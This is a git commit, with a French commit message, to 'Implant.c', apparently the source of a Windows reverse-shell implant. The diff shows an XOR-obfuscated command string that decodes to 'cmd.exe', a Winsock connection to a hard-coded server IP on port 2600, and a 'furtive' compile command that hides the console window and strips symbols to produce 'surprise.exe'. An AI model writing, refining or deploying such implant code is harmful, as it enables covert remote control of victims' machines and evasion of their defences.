f0efd948ebbc71bf774a02545b71331b4bed91c5
Bastien FAUGIER <133578470+korakino@users.noreply.github.com>
2026-05-07 10:02:08 +0000

    Correction de la commande futiv et ajustement de la longueur dans la fonction decode, mise à jour de l'adresse IP du serveur, suppression de l'ancien fichier implant.exe et ajout d'un nouveau fichier surprise.exe.

--- Implant.c
+++ Implant.c
@@ -1,12 +1,12 @@
 #include "implant.h"
 // Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32
-// futiv command : x86_64-w64-mingw32-gcc implant.c -o surprise.exe -lws2_32 -mwindows -s
+// futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -mwindows -s
 int main(){
 // Set variables
     char rcvbuffer[DEFAULT_BUFLEN];
     char sndbuffer[DEFAULT_BUFLEN];
     char command[] = { 0x28, 0x26, 0x2F, 0x65, 0x2E, 0x33, 0x2E, 0x00 };
-    decode(command, 'K', 8);
+    decode(command, 'K', 7);
     WSADATA wsa;
     WSAStartup(MAKEWORD(2,2), &wsa);
     SOCKET soc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
@@ -32,7 +32,7 @@ int main(){
     // set server's variables
     server.sin_family = AF_INET;
     server.sin_port = htons(2600);
-    server.sin_addr.s_addr = inet_addr("10.92.230.240");
+    server.sin_addr.s_addr = inet_addr("192.168.1.146");
 
     connect(soc, (struct sockaddr *)&server, sizeof(server));
 
